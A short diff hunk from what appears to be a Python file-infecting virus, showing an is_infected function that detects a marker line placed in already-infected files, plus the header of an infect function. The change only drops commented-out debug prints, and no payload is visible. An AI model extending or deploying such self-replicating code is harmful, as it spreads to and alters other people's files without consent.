@@ -108,8 +108,6 @@ def is_infected(filename):
    lines = f.readlines()
    if len(lines) < 46:
       return False
-   #print len(lines)
-   #print lines[len(lines) - 46]
    return lines[len(lines) - 46].startswith('######################################################## First script python')
 
 def infect(filename):
